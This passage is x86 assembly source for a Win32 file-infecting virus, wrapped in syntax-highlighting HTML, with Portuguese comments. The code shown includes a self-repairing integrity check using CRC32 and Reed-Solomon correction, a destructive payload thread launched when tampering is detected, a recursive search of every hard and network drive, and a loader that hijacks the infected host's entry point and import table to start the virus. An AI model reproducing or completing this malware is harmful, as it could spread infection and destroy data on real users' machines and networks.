  </span><span class="sc5">verifica_virus</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calcula_crc</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crc32</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">verifica_virus</span><span class="sc0">                        </span><span class="sc1">;virus foi modificado?</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">espera</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;corrigindo virus, p†ra tudo</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">proximo_bloco</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">constroi_bloco</span><span class="sc0">                      </span><span class="sc1">;esi=6 bytes de CCE</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;posiá∆o no buffer</span><span class="sc0">
       </span><span class="sc6">cmpsd</span><span class="sc0">
       </span><span class="sc6">lahf</span><span class="sc0">
       </span><span class="sc6">cmpsw</span><span class="sc0">                                    </span><span class="sc1">;compara codigo para este bloco</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">e_este</span><span class="sc0">
       </span><span class="sc6">sahf</span><span class="sc0">
  </span><span class="sc5">e_este</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">bloco_ok</span><span class="sc0">                              </span><span class="sc1">;bloco foi modificado?</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">BLOCOS</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc4">)]</span><span class="sc0">                </span><span class="sc1">;edi=buffer temporario</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rsdecode</span><span class="sc0">                           </span><span class="sc1">;corrige</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">mexeu_pagou</span><span class="sc0">                           </span><span class="sc1">;corrigiu todos os erros?</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
  </span><span class="sc5">corrige_byte</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BLOCOS</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;corrige byte</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">250</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">corrige_byte</span><span class="sc0">
  </span><span class="sc5">bloco_ok</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BLOCOS</span><span class="sc0">                           </span><span class="sc1">;proximo bloco</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">proximo_bloco</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">espera</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;tudo volta ao normal...</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">verifica_virus</span><span class="sc0">
  </span><span class="sc5">mexeu_pagou</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">fode_tudo</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">busca_recursiva</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">cria_thread</span><span class="sc0">                         </span><span class="sc1">;ativa o virus!</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirtualFree</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;libera memoria</span><span class="sc0">
  </span><span class="sc5">deu_merda</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">busca_recursiva</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;parÉmetro=rotina de arquivo</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"\:@"</span><span class="sc0">                         </span><span class="sc1">;inicia busca por A:\
  proximo_disco:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"Z"</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">tudo</span><span class="sc0">                                  </span><span class="sc1">;se j† tamos no Z:\, para</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetDriveTypeA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">;Ç disco rigido?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fixo</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                </span><span class="sc1">;ou disco de rede?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">proximo_disco</span><span class="sc0">
  </span><span class="sc5">fixo</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">proximo_disco</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;rotina CALLBACK</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">busca_disco</span><span class="sc0">                         </span><span class="sc1">;busca dentro dos diret¢rios</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">proximo_disco</span><span class="sc0">
  </span><span class="sc5">tudo</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;todos os discos processados</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">deu_merda</span><span class="sc0">

</span><span class="sc5">busca_disco</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SIZEOF_WIN32_FIND_DATA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"*.*"</span><span class="sc0"> </span><span class="sc1">;constroi m†scara de busca</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">".."</span><span class="sc0"> </span><span class="sc1">;e para mudar de diret¢rio</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SIZEOF_WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;salva handle da busca</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sobe_dir</span><span class="sc0">
  </span><span class="sc5">verifica_dir</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">e_dir</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;chama CALLBACK</span><span class="sc0">
  </span><span class="sc5">continua_busca</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;procura proximo arquivo</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">verifica_dir</span><span class="sc0">
  </span><span class="sc5">sobe_dir</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindClose</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ponteiro para ".."</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">deu_merda</span><span class="sc0">
  </span><span class="sc5">e_dir</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">continua_busca</span><span class="sc0">                        </span><span class="sc1">;evita travar</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;entra no diret¢rio</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">continua_busca</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">busca_disco</span><span class="sc0">                         </span><span class="sc1">;busca recursiva</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continua_busca</span><span class="sc0">

</span><span class="sc5">cria_thread</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                   </span><span class="sc1">;CREATE_SUSPENDED</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;parÉmetro</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;rotina</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateThread_</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">deu_pau</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">thread_id</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">15</span><span class="sc0">                                 </span><span class="sc1">;THREAD_PRIORITY_IDLE</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetThreadPriority</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ResumeThread</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">deu_pau</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc9">.xlist</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ECC</span><span class="sc0">\</span><span class="sc5">rslib.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ECC</span><span class="sc0">\</span><span class="sc5">gflib.asm</span><span class="sc0">
</span><span class="sc9">.list</span><span class="sc0">

</span><span class="sc5">calcula_crc</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">crc32</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;rotina de zhengxi</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
  </span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@@3</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDB88320h</span><span class="sc0">                      </span><span class="sc1">;polinomio</span><span class="sc0">
  </span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@2</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
  </span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;devolve not(crc32)</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">loader</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc5">entrypoint</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;eax!=0 se arquivo foi relocado</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">host_createthread</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;endereáo de CreateThread na ImportTable</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                               </span><span class="sc1">;entrada do desencriptador</span><span class="sc0">
     </span><span class="sc5">virus_pointer</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                               </span><span class="sc1">;chama CreateThread</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
